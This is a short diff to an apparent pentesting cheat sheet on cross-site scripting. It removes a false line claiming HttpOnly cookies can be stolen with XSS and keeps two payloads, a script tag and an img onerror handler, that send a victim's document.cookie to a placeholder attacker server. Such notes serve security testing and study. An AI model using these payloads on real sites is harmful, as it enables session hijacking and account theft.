@@ -8,7 +8,6 @@ pagetitle: XSS
 - Very nice for performing authenticated actions, keylogging, or stealing cookies if they aren't HttpOnly
 
 **Stealing Cookies**
-Cookies with HttpOnly can be stolen with XSS
 - `<script>fetch('http://{server}?c='+document.cookie)</script>`
 - `<img src=x onerror=this.src='http://{server}/?c='+document.cookie>`
 
